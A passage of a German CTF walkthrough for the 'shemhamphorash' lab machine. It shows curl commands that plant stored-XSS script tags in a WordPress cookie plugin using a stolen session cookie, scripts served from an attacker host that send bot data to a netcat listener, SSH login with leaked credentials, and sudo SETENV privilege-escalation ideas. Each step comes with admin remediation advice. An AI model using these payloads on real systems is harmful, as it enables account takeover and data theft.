<p class="analysis"><strong>Analyse:</strong> Der Netcat-Listener empfängt zweimal Daten vom Admin-Bot (<code>192.168.2.203</code>). In beiden Fällen ist der Parameter <code>bot_is_admin=false</code>. Der Statuscode ist <code>0</code> und <code>final_url</code> zeigt auf das Admin-Dashboard, aber der <code>fetch</code>-Request scheint nicht erfolgreich gewesen zu sein im Sinne eines eingeloggten Admins (eventuell wegen <code>redirect: 'manual'</code> und der Bot wird zur Login-Seite umgeleitet, was der Payload als <code>isAdmin = false</code> interpretiert). Die <code>status=0</code> deutet oft auf einen Netzwerkfehler oder eine Cross-Origin-Problematik hin, wenn <code>fetch</code> bestimmte Antworten nicht direkt lesen darf (opaqueredirect).</p>
<p class="evaluation"><strong>Bewertung:</strong> Enttäuschendes Ergebnis. Der Bot scheint trotz der zuvor im BeEF-Panel gesichteten "Admin-Cookies" keinen direkten Zugriff auf <code>/wp-admin/index.php</code> zu haben oder die Logik des Payloads interpretiert die Antwort falsch. Die Annahme, dass der Bot Admin-Rechte hat, muss eventuell revidiert werden oder der Test-Payload ist nicht robust genug, um alle Szenarien (wie opaqueredirects) korrekt zu behandeln.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den JavaScript-Payload (<code>JS_PAYLOAD</code>) überarbeiten. Die Logik zur Bestimmung, ob der Bot Admin ist, muss möglicherweise verfeinert werden, um z.B. opaqueredirects besser zu deuten oder andere Indikatoren für eine Admin-Sitzung zu prüfen (z.B. Existenz bestimmter Elemente auf der Seite, die nur Admins sehen). Alternativ direkt versuchen, eine Admin-Aktion auszuführen (wie das Erstellen eines Benutzers) und auf Erfolg oder Misserfolg prüfen, anstatt den Admin-Status vorab zu ermitteln.
<br><strong>Empfehlung (Admin):</strong> Auch wenn dieser spezifische Check fehlschlug, bleibt die XSS-Lücke kritisch. Es ist möglich, dass ein anderer Payload oder ein anderer Bot-Zustand zu einem erfolgreichen Angriff führt.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">curl -X POST 'http://shemhamphorash.local/sitecore/wp-admin/admin-ajax.php' \
-H "Cookie: ${BLESSED_COOKIE}" \
--data-urlencode "action=easy_cookies_policy_save_settings" \
--data-urlencode "maintext=&lt;script src='http://192.168.2.199:8000/nginx_log_probe.js'&gt;&lt;/script&gt;" \
--data-urlencode "background=black" \
--data-urlencode "transparency=100" \
--data-urlencode "close=accept" \
--data-urlencode "expires=30" \
--data-urlencode "enabled=true" \
--data-urlencode "display=onpage" \
--data-urlencode "position=top" \
--data-urlencode "button_text=Probing Nginx..." \
--data-urlencode "text_color=#ffffff"</span></div>
        <pre>{"status":"OK","text":"Configuration data updated","url":"http:\/\/shemhamphorash.local\/sitecore","cookie":"easy_cookies_policy_warning"}</pre>
    </div>
</div>
<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">while true; do nc -lvnp 9001; done</span></div>
        <pre>
listening on [any] 9001 ...
connect to [192.168.2.199] from (UNKNOWN) [192.168.2.203] 34620
GET /?<span class="password">nginx_log_probe_sent=NGINX_PROBE_By_CCat_fnzoqurdu3</span>&amp;target_nginx_host=shemhamphorash.local HTTP/1.1
Host: 192.168.2.199:9001
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://shemhamphorash.local/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

listening on [any] 9001 ...
</pre>
    </div>
</div>
<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/shells]
└─# <span class="command">python3 -m http.server 8000</span></div>
        <pre>
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
<span class="password">192.168.2.203 - - [27/May/2025 17:15:02] "GET /nginx_log_probe.js HTTP/1.1" 200 -</span>
192.168.2.203 - - [27/May/2025 17:16:04] "GET /nginx_log_probe.js HTTP/1.1" 304 -
</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Ein neuer XSS-Payload wird injiziert: <code>&lt;script src='http://192.168.2.199:8000/nginx_log_probe.js'&gt;&lt;/script&gt;</code>.
Der Python-Server liefert <code>nginx_log_probe.js</code> erfolgreich an den Bot (<code>192.168.2.203</code>).
Der Netcat-Listener empfängt eine Nachricht vom Bot: <code>nginx_log_probe_sent=NGINX_PROBE_By_CCat_fnzoqurdu3&amp;target_nginx_host=shemhamphorash.local</code>.
Der String <code>NGINX_PROBE_By_CCat_fnzoqurdu3</code> ist ein einzigartiger Identifikator. Die Idee hier ist wahrscheinlich, eine Anfrage an einen Nginx-Server zu senden (möglicherweise an den auf Port 8080), die diesen einzigartigen String enthält. Wenn dieser String dann in den Nginx-Logdateien auf dem Zielserver gefunden wird, könnte dies ein Weg sein, um zu bestätigen, dass der Bot die Anfrage ausgeführt hat und um möglicherweise Inhalte in die Logs zu schreiben (Log Injection), falls das Skript versucht, ungültige Zeichen oder Befehle in der Anfrage-URL unterzubringen. Die Variable <code>target_nginx_host=shemhamphorash.local</code> deutet auf das Ziel des Probes hin.</p>
<p class="evaluation"><strong>Bewertung:</strong> Dies ist eine kreative Methode, um zu testen, ob Aktionen im Browser des Bots ausgeführt werden können, die serverseitige Spuren (Log-Einträge) hinterlassen. Es ist kein direkter Weg zur Privilegienerweiterung, aber es kann Informationen über die Systemkonfiguration und das Logging-Verhalten liefern oder als Proof-of-Concept für die Ausführung von JavaScript dienen. Der eindeutige String ist gut gewählt, um ihn später in Logs zu finden.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nachdem dieser Probe ausgeführt wurde, versuchen, auf die Nginx-Logdateien auf dem Zielserver zuzugreifen (falls später eine Shell erlangt wird), um nach dem String <code>NGINX_PROBE_By_CCat_fnzoqurdu3</code> zu suchen. Dies könnte auch als Dead-Drop-Kommunikationskanal dienen, wenn man Inhalte in die Logs schreiben und später auslesen kann.
<br><strong>Empfehlung (Admin):</strong> Regelmäßige Überprüfung der Logdateien auf ungewöhnliche Einträge. Eingaben, die in Logdateien geschrieben werden, sollten saniert werden, um Log Injection oder die Ausführung von Terminal-Steuerzeichen zu verhindern, falls die Logs in einem Terminal angezeigt werden.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~/easy/easy-cookies-policy/files]
└─# <span class="command">while true; do nc -lvnp 9001; done</span></div>
        <pre>
listening on [any] 9001 ...
connect to [192.168.2.199] from (UNKNOWN) [192.168.2.204] 51574
GET /?check_login_result=%7B%22url_requested%22%3A%22%2Fsitecore%2Fwp-admin%2Findex.php%22%2C%22response_url%22%3A%22http%3A%2F%2Fshemhamphorash.local%2Fsitecore%2Fwp-admin%2Findex.php%22%2C%22status%22%3A0%2C%22type%22%3A%22opaqueredirect%22%2C%22is_admin_likely%22%3Afalse%2C%22redirected_to_login%22%3Atrue%7D HTTP/1.1
Host: 192.168.2.199:9001
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://shemhamphorash.local/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Der Netcat-Listener empfängt Daten, diesmal vom Host <code>192.168.2.204</code>. Dies ist eine neue IP-Adresse für den Bot (vorher <code>.203</code>). Es ist möglich, dass der Bot dynamische IPs verwendet oder es mehrere Bots gibt.
Die gesendeten Daten (<code>check_login_result</code>) sind das Ergebnis eines Versuchs des XSS-Handlers, auf <code>/sitecore/wp-admin/index.php</code> zuzugreifen.
Dekodiert: <code>{"url_requested":"/sitecore/wp-admin/index.php", "response_url":"http://shemhamphorash.local/sitecore/wp-admin/index.php", "status":0, "type":"opaqueredirect", "is_admin_likely":false, "redirected_to_login":true}</code>
Dies bestätigt, dass der Bot (nun von <code>.204</code>) bei dem Versuch, auf das Admin-Dashboard zuzugreifen, zur Login-Seite weitergeleitet wurde (<code>redirected_to_login:true</code>) und somit keine aktive Admin-Sitzung hatte. Der Status 0 und Typ "opaqueredirect" sind typisch für Cross-Origin-Fetch-Anfragen, die auf eine Ressource treffen, die eine Weiterleitung zu einer anderen Origin oder eine Authentifizierungsanforderung auslöst, deren Details dem Skript nicht preisgegeben werden.</p>
<p class="evaluation"><strong>Bewertung:</strong> Konsistent mit den vorherigen Ergebnissen des Admin-Checks. Der Bot, egal ob von <code>.203</code> oder <code>.204</code>, scheint keine aktive Admin-Sitzung zu haben, wenn der XSS-Payload ausgeführt wird. Dies erschwert die Strategie, Aktionen im Namen eines Admins auszuführen.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Hypothese, dass der Bot Admin-Rechte hat, muss kritisch hinterfragt werden. Vielleicht führt der Bot Aktionen mit niedrigeren Rechten aus oder besucht die Seite ohne gültige Sitzung. Die XSS-Schwachstelle könnte dennoch genutzt werden, um Aktionen auszuführen, die der Benutzer <code>blessed</code> (dessen Cookie für die Injektion verwendet wird) durchführen darf, oder um komplexere Angriffe wie das Phishing von Admin-Anmeldeinformationen zu versuchen, wenn der Bot von einem echten Admin gesteuert wird, der sich dann einloggt.
<br><strong>Empfehlung (Admin):</strong> Die XSS-Schwachstelle beheben. Das Verhalten des "Bots" (<code>192.168.2.203</code> / <code>192.168.2.204</code>) untersuchen. Handelt es sich um einen legitimen Dienst (z.B. einen internen Crawler, einen Health-Checker)? Wenn ja, sicherstellen, dass er mit minimalen Rechten arbeitet und nicht unnötig Admin-Seiten besucht.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/shells]
└─# <span class="command">BLESSED_COOKIE='wordpress_logged_in_b0701dcfcb81ecfdbc03102527da7cda=blessed%7C1748552017%7CTILeXcMMdjKVuV207icH0pvvUcuPHQHKD7xFmBOsKK1%7C67bac9f8f0d382efe6cc8db898e6a31df5f344cf38a5aca94cd85912a05c5176'</span></div>
    </div>
</div>
<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/shells]
└─# <span class="command">curl -X POST 'http://shemhamphorash.local/sitecore/wp-admin/admin-ajax.php' \ 
-H "Cookie: ${BLESSED_COOKIE}" \
--data-urlencode "action=easy_cookies_policy_save_settings" \
--data-urlencode "maintext=&lt;script src='http://192.168.2.199:8000/create_admin_script.js'&gt;&lt;/script&gt;" \
--data-urlencode "background=black" \
--data-urlencode "transparency=100" \
--data-urlencode "close=accept" \
--data-urlencode "expires=30" \
--data-urlencode "enabled=true" \
--data-urlencode "display=onpage" \
--data-urlencode "position=top" \
--data-urlencode "button_text=Creating Admin..." \
--data-urlencode "text_color=#ffffff"</span></div>
        <pre>{"status":"OK","text":"Configuration data updated","url":"http:\/\/shemhamphorash.local\/sitecore","cookie":"easy_cookies_policy_warning"}</pre>
    </div>
</div>
<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/shells]
└─# <span class="command">python3 -m http.server 8000</span></div>
        <pre>
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.2.204 - - [27/May/2025 22:58:02] "GET /check_admin_login.js HTTP/1.1" 200 -
192.168.2.204 - - [27/May/2025 23:04:01] "GET /check_admin_login.js HTTP/1.1" 304 -
<span class="password">192.168.2.204 - - [27/May/2025 23:07:01] "GET /create_admin_script.js HTTP/1.1" 200 -</span>
</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong>
1.  Ein neuer Wert für <code>BLESSED_COOKIE</code> wird in der Shell gesetzt. Dies ist wichtig, da Login-Cookies ablaufen können.
2.  Ein neuer XSS-Payload wird injiziert: <code>&lt;script src='http://192.168.2.199:8000/create_admin_script.js'&gt;&lt;/script&gt;</code>. Dieser soll, wie der Name andeutet, versuchen, einen neuen Administrator-Account in WordPress zu erstellen.
3.  Der Python-HTTP-Server-Log zeigt, dass der Bot (<code>192.168.2.204</code>) zuerst ein Skript namens <code>check_admin_login.js</code> (wahrscheinlich eine vorherige Version des Payloads) und dann erfolgreich <code>create_admin_script.js</code> lädt.</p>
<p class="evaluation"><strong>Bewertung:</strong> Dies ist der bisher direkteste Versuch, die XSS-Schwachstelle auszunutzen, um administrative Kontrolle zu erlangen. Wenn <code>create_admin_script.js</code> erfolgreich einen neuen Admin-Benutzer anlegt (indem es die notwendigen AJAX-Anfragen mit den Cookies und Nonces des Admin-Bots sendet), wäre dies ein großer Erfolg.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Netcat-Listener beobachten, ob <code>create_admin_script.js</code> Erfolg oder Misserfolg meldet. Anschließend versuchen, sich mit den im Skript definierten Zugangsdaten des neuen Admin-Users in WordPress einzuloggen. Das Skript muss robust genug sein, um Nonces zu extrahieren und die korrekten AJAX-Endpunkte anzusprechen.
<br><strong>Empfehlung (Admin):</strong> Die XSS-Schwachstelle muss unbedingt behoben werden. WordPress-Nonces bieten einen gewissen Schutz gegen CSRF, aber nicht gegen XSS, wenn der Angreifer JavaScript im Kontext einer eingeloggten Sitzung ausführen kann. Überwachung der Benutzererstellung und Audit-Logs.</p>

<div class="code-block">
    <div class="terminal">
        <pre>
listening on [any] 9001 ...
connect to [192.168.2.199] from (UNKNOWN) [192.168.2.204] 51658
GET /?check_login_result=%7B%22url_requested%22%3A%22%2Fsitecore%2Fwp-admin%2Findex.php%22%2C%22response_url%22%3A%22http%3A%2F%2Fshemhamphorash.local%2Fsitecore%2Fwp-admin%2Findex.php%22%2C%22status%22%3A0%2C%22type%22%3A%22opaqueredirect%22%2C%22is_admin_likely%22%3Afalse%2C%22redirected_to_login%22%3Atrue%7D HTTP/1.1
Host: 192.168.2.199:9001
...
listening on [any] 9001 ...
connect to [192.168.2.199] from (UNKNOWN) [192.168.2.204] 51774
GET /?<span class="password">%7B%22event%22%3A%22fetch_nonce_start%22%2C%22data%22%3A%7B%22url%22%3A%22%2Fsitecore%2Fwp-admin%2Fuser-new.php%22%7D%2C%22timestamp%22%3A1748380082045%7D</span> HTTP/1.1
Host: 192.168.2.199:9001
...
  127.0.0.1 - - [15/Apr/2022:13:24:02 -0400] "GET /.superpass/admin.php?USERNAME=caiaphas&amp;PASSWORD=kx5h48jo9up97jw HTTP/1.1" 200 5 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"
  127.0.0.1 - - [15/Apr/2022:13:24:04 -0400] "GET /.superpass/admin.php?USERNAME=caiaphas&amp;PASSWORD=kx5h48jo9up97jw HTTP/1.1" 200 5 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"
listening on [any] 9001 ...
connect to [192.168.2.199] from (UNKNOWN) [192.168.2.204] 51918
GET /?<span class="password">%7B%22event%22%3A%22script_loaded%22%2C%22data%22%3A%7B%22user_agent%22%3A%22Mozilla%2F5.0%20(X11%3B%20Linux%20x86_64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F100.0.4896.60%20Safari%2F537.36%22%2C%22location%22%3A%22http%3A%2F%2Fshemhamphorash.local%2Fsitecore%2F%22%7D%2C%22timestamp%22%3A1748380383702%7D</span> HTTP/1.1
Host: 192.168.2.199:9001
...
</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Der Netcat-Listener empfängt mehrere Nachrichten vom Bot (<code>192.168.2.204</code>), nachdem dieser <code>create_admin_script.js</code> geladen hat.
1.  Die erste Nachricht ist wieder das Ergebnis des Admin-Checks (<code>check_login_result</code>), der fehlschlägt (<code>is_admin_likely:false, redirected_to_login:true</code>).
2.  Die zweite Nachricht ist viel interessanter: <code>{"event":"fetch_nonce_start", "data":{"url":"/sitecore/wp-admin/user-new.php"}, "timestamp":...}</code>. Dies zeigt, dass <code>create_admin_script.js</code> versucht, die Seite zum Erstellen eines neuen Benutzers (<code>user-new.php</code>) abzurufen, wahrscheinlich um eine Nonce (eine Art Einmal-Token zum Schutz vor CSRF-Angriffen) zu extrahieren, die für das Erstellen eines neuen Benutzers benötigt wird.
3.  Dazwischen sind Log-Einträge (vermutlich vom Zielsystem oder einem anderen System, nicht vom Listener des Angreifers) die Zugriffe auf <code>/.superpass/admin.php</code> mit Zugangsdaten für <code>caiaphas</code> und <code>gamaliel</code> zeigen. Dies scheint ein separates, aber möglicherweise relevantes Ereignis zu sein, das auf eine andere Schwachstelle oder einen anderen Informationsleak hindeutet (Passwörter im Klartext in URLs!).
4.  Die dritte Nachricht vom Bot ist <code>{"event":"script_loaded", "data":{...}, "timestamp":...}</code>, eine generische Meldung, dass das Skript geladen wurde.

Die Logzeilen mit <code>/.superpass/admin.php</code> sind extrem auffällig. Sie deuten auf einen Mechanismus hin, bei dem Benutzername und Passwort direkt als GET-Parameter übergeben werden (<code>USERNAME=caiaphas&PASSWORD=kx5h48jo9up97jw</code>). Dies ist eine massive Sicherheitslücke, da diese Daten in Server-Logs, Browser-Verläufen etc. gespeichert werden können.</p>
<p class="evaluation"><strong>Bewertung:</strong> Das <code>create_admin_script.js</code> scheint Fortschritte zu machen, indem es versucht, eine Nonce von der Benutzererstellungsseite zu holen. Die dazwischenliegenden Log-Einträge sind ein **Goldfund**, falls sie vom Zielsystem stammen. Sie enthüllen potenziell gültige Zugangsdaten (<code>caiaphas:kx5h48jo9up97jw</code> und <code>gamaliel:kx5h48jo9up97jw</code>) für einen unbekannten Dienst <code>/.superpass/admin.php</code>. Dies könnte ein alternativer Weg zum Initial Access oder zur Privilegienerweiterung sein.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
    Sofort die URL <code>http://192.168.2.202/.superpass/admin.php</code> (oder <code>http://shemhamphorash.hmv/.superpass/admin.php</code>) im Browser aufrufen und versuchen, sich mit den geleakten Zugangsdaten <code>caiaphas:kx5h48jo9up97jw</code> und <code>gamaliel:kx5h48jo9up97jw</code> einzuloggen. Dies könnte ein separates Admin-Panel oder eine Hintertür sein.
    Parallel dazu die Entwicklung von <code>create_admin_script.js</code> fortsetzen. Wenn es die Nonce erfolgreich extrahieren und einen neuen WordPress-Admin-Benutzer erstellen kann, ist das ebenfalls ein Gewinn.
<br><strong>Empfehlung (Admin):</strong> Die Anwendung oder das Skript hinter <code>/.superpass/admin.php</code> sofort untersuchen und vom Netz nehmen. Die Übertragung von Zugangsdaten als GET-Parameter ist inakzeptabel und muss sofort behoben werden. Alle Passwörter der betroffenen Benutzer (<code>caiaphas</code>, <code>gamaliel</code>) müssen sofort geändert werden. Die XSS-Lücke in WordPress schließen.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">caiaphas@shemhamphorash:~$ </div>
        <pre>
Linux shemhamphorash 5.10.0-13-amd64 #1 SMP Debian 5.10.106-1 (2022-03-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
caiaphas@shemhamphorash:~$ </pre>
    </div>
</div>
<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~/easy/easy-cookies-policy/files]
└─# <span class="command">ssh caiaphas@192.168.2.204 -p 22222</span></div>
        <pre>
caiaphas@192.168.2.204's password: <span class="password">kx5h48jo9up97jw</span>
</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Der Pentester nutzt die in den Log-Dateien (<code>/.superpass/admin.php</code>) gefundenen Zugangsdaten <code>caiaphas:kx5h48jo9up97jw</code>, um sich per SSH auf Port 22222 mit dem Host <code>192.168.2.204</code> zu verbinden. Es ist zu beachten, dass dies die IP des "Bots" ist, nicht die ursprüngliche Ziel-IP <code>192.168.2.202</code>.
Der Login ist erfolgreich! Der Pentester erhält eine Shell als Benutzer <code>caiaphas</code> auf dem System <code>shemhamphorash</code> (was darauf hindeutet, dass <code>.202</code> und <code>.204</code> möglicherweise dasselbe System sind oder zumindest denselben Hostnamen haben, oder der Bot läuft auf dem Zielsystem selbst).</p>
<p class="evaluation"><strong>Bewertung:</strong> **Fantastisch! Initial Access erreicht!** Dies ist ein signifikanter Durchbruch. Die Entdeckung der Zugangsdaten in den Log-Dateien war ein kritischer Fund und hat den direkten Zugriff auf das System ermöglicht, noch bevor der XSS-Angriff zur Erstellung eines Admin-Users in WordPress vollständig umgesetzt werden musste. Der Umweg über die Log-Analyse hat sich als schnellerer Weg erwiesen.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sofort die Umgebung als Benutzer <code>caiaphas</code> erkunden:
    <code>id</code>, <code>whoami</code>, <code>pwd</code>
    <code>sudo -l</code>, um zu prüfen, welche Befehle mit Root-Rechten ausgeführt werden dürfen.
    Home-Verzeichnis untersuchen (<code>ls -la ~</code>).
    Nach Benutzer- und Root-Flags suchen.
    Netzwerkkonfiguration prüfen (<code>ip a</code>, <code>ss -tulnp</code>).
    Laufende Prozesse untersuchen.
<br><strong>Empfehlung (Admin):</strong> Sofort das Passwort für den Benutzer <code>caiaphas</code> auf allen Systemen ändern. Die Anwendung <code>/.superpass/admin.php</code> abschalten und untersuchen. Implementieren einer Passwort-Policy, die die Verwendung solch unsicherer Mechanismen verbietet. Server-Logs regelmäßig auf verdächtige Zugriffe und Informationslecks überprüfen.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">caiaphas@shemhamphorash:~$ <span class="command">ls -la</span></div>
        <pre>
total 84
dr-x------  9 caiaphas caiaphas 4096 Apr 15  2022 .
drwxr-xr-x  4 root     root     4096 Apr  8  2022 ..
lrwxrwxrwx  1 root     root        9 Apr 12  2022 .bash_history -> /dev/null
-rw-r--r--  1 caiaphas caiaphas  220 Apr  7  2022 .bash_logout
-rw-r--r--  1 caiaphas caiaphas 3526 Apr  7  2022 .bashrc
drwxr-xr-x 11 caiaphas caiaphas 4096 Apr 15  2022 .cache
drwx------ 10 caiaphas caiaphas 4096 Apr 15  2022 .config
drwxr-xr-x  2 caiaphas caiaphas 4096 Apr 10  2022 Desktop
-rw-r--r--  1 caiaphas caiaphas   35 Apr  8  2022 .dmrc
drwx------  3 caiaphas caiaphas 4096 Apr  7  2022 .gnupg
-rw-------  1 caiaphas caiaphas    0 Apr  7  2022 .ICEauthority
drwxr-xr-x  3 caiaphas caiaphas 4096 Apr  7  2022 .local
drwx------  5 caiaphas caiaphas 4096 Apr  7  2022 .mozilla
drwx------  3 caiaphas caiaphas 4096 Apr  8  2022 .pki
-rw-r--r--  1 caiaphas caiaphas  807 Apr  7  2022 .profile
-rw-r--r--  1 caiaphas caiaphas   66 Apr  7  2022 .selected_editor
<span class="command">-r--------  1 caiaphas caiaphas   33 Apr 12  2022 user.txt</span>
-rw-r--r--  1 caiaphas caiaphas  215 Apr  9  2022 .wget-hsts
-rw-------  1 caiaphas caiaphas  236 Apr 15  2022 .Xauthority
-rw-------  1 caiaphas caiaphas 5175 Apr 15  2022 .xsession-errors
-rw-------  1 caiaphas caiaphas 5760 Apr 14  2022 .xsession-errors.old</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Der Befehl <code>ls -la</code> listet den Inhalt des Home-Verzeichnisses des Benutzers <code>caiaphas</code> auf, einschließlich versteckter Dateien und detaillierter Informationen.
Die wichtigste Entdeckung hier ist die Datei <code>user.txt</code>. Die Berechtigungen (<code>-r--------</code>) zeigen, dass nur der Benutzer <code>caiaphas</code> die Datei lesen kann.</p>
<p class="evaluation"><strong>Bewertung:</strong> Das Vorhandensein einer Datei namens <code>user.txt</code> im Home-Verzeichnis eines Benutzers ist in Capture-The-Flag (CTF)-Szenarien und Penetrationstests auf Übungsmaschinen ein klarer Hinweis auf die Benutzer-Flag. Das Home-Verzeichnis selbst (<code>.</code>) ist mit <code>dr-x------</code> sehr restriktiv gesetzt, was unüblich ist und bedeutet, dass der Benutzer selbst nicht in sein eigenes Home-Verzeichnis schreiben oder neue Dateien erstellen kann, sondern nur lesen und ausführen.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Inhalt von <code>user.txt</code> sofort mit <code>cat user.txt</code> auslesen. Die ungewöhnlichen Berechtigungen des Home-Verzeichnisses zur Kenntnis nehmen, dies könnte später relevant sein.
<br><strong>Empfehlung (Admin):</strong> Die Berechtigungen von Home-Verzeichnissen sollten typischerweise dem Benutzer Lese-, Schreib- und Ausführrechte gewähren (z.B. <code>drwxr-x---</code> oder <code>drwx------</code>). Die hier gesetzten <code>dr-x------</code> sind sehr ungewöhnlich und könnten auf eine Fehlkonfiguration oder eine spezifische Absicht hindeuten. Flags oder sensible Informationen sollten nicht einfach in Textdateien in Benutzerverzeichnissen abgelegt werden.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">caiaphas@shemhamphorash:~$ <span class="command">cat user.txt</span></div>
        <pre><span class="password">c567f59d28c51c1c4f006f67b889b986</span></pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Der Inhalt der Datei <code>user.txt</code> wird ausgegeben. Es handelt sich um den String <code>c567f59d28c51c1c4f006f67b889b986</code>.</p>
<p class="evaluation"><strong>Bewertung:</strong> **User-Flag gefunden!** Dies ist ein wichtiger Meilenstein im Penetrationstest.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die User-Flag dokumentieren. Nun auf die Privilegienerweiterung zum Root-Benutzer konzentrieren.
<br><strong>Empfehlung (Admin):</strong> Solche Flags sind typisch für CTFs. In realen Umgebungen sollten sensible Daten nicht auf diese Weise gespeichert werden.</p>
        </section>

        <section id="privilege-escalation">
            <h2>Privilege Escalation</h2>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">caiaphas@shemhamphorash:~$ <span class="command">sudo -l</span></div>
        <pre>
[sudo] password for caiaphas: <span class="password">kx5h48jo9up97jw</span> 
Matching Defaults entries for caiaphas on shemhamphorash:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User caiaphas may run the following commands on shemhamphorash:
    <span class="password">(ALL) SETENV: /root/.script/viewlog.sh</span>
</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Der Befehl <code>sudo -l</code> wird ausgeführt, um aufzulisten, welche Befehle der Benutzer <code>caiaphas</code> mit <code>sudo</code> (also mit Root-Rechten) ausführen darf. Das Passwort für <code>caiaphas</code> (<code>kx5h48jo9up97jw</code>) wird erneut eingegeben.
Die Ausgabe zeigt, dass <code>caiaphas</code> den Befehl <code>/root/.script/viewlog.sh</code> mit Root-Rechten ausführen darf. Wichtig ist hier auch der Zusatz <code>SETENV:</code>, der bedeutet, dass der Benutzer beim Ausführen dieses Skripts Umgebungsvariablen setzen darf (z.B. <code>LD_PRELOAD</code>, <code>PATH</code>).</p>
<p class="evaluation"><strong>Bewertung:</strong> Dies ist ein sehr vielversprechender Eintrag für die Privilegienerweiterung. Wenn ein Benutzer ein Skript als Root ausführen darf und dabei auch noch Umgebungsvariablen wie <code>PATH</code> oder <code>LD_PRELOAD</code> beeinflussen kann, eröffnen sich oft Wege, um eigenen Code mit Root-Rechten auszuführen.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
1.  Das Skript <code>/root/.script/viewlog.sh</code> untersuchen (falls lesbar, was unwahrscheinlich ist, da es im Root-Verzeichnis liegt).
2.  Prüfen, ob das Skript andere Befehle ohne absoluten Pfad aufruft. Wenn ja, könnte die <code>PATH</code>-Variable manipuliert werden, um einen eigenen bösartigen Befehl mit demselben Namen in einem vom Angreifer kontrollierbaren Verzeichnis zu platzieren (PATH-Hijacking).
3.  Prüfen, ob das Skript dynamisch gelinkte Bibliotheken verwendet. Wenn ja, könnte <code>LD_PRELOAD</code> genutzt werden, um eine eigene Bibliothek vorzuladen, die dann mit Root-Rechten ausgeführt wird.
<br><strong>Empfehlung (Admin):</strong> Sudo-Regeln sehr restriktiv gestalten. Wenn Skripte mit Root-Rechten ausgeführt werden müssen, sicherstellen, dass diese Skripte sicher geschrieben sind:
    Alle externen Befehle mit vollen Pfaden aufrufen.
    Umgebungsvariablen sorgfältig behandeln und nicht benötigte (wie <code>LD_PRELOAD</code>) über die <code>env_keep</code>-Direktive oder durch <code>noenv</code> im Sudoers-Eintrag zurücksetzen/verbieten.
    Skripte sollten idealerweise keine Benutzereingaben direkt in Befehle einbauen, ohne sie zu validieren/sanieren.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">caiaphas@shemhamphorash:~$ <span class="command">ss -altpn</span></div>
        <pre>
State     Recv-Q    Send-Q        Local Address:Port          Peer Address:Port    Process    
LISTEN    0         80                <span class="command">127.0.0.1:3306</span>               0.0.0.0:*                  
LISTEN    0         128                 <span class="command">0.0.0.0:22222</span>              0.0.0.0:*                  
LISTEN    0         511                 <span class="command">0.0.0.0:8080</span>               0.0.0.0:*                  
LISTEN    0         128               <span class="command">127.0.0.1:631</span>                0.0.0.0:*                  
LISTEN    0         128                    <span class="command">[::]:22222</span>                 [::]:*                  
LISTEN    0         511                       <span class="command">*:80</span>                       *:*                  
LISTEN    0         511                    <span class="command">[::]:8080</span>                  [::]:*                  
LISTEN    0         128                   <span class="command">[::1]:631</span>                   [::]:*                   
</pre>
    </div>
</div>
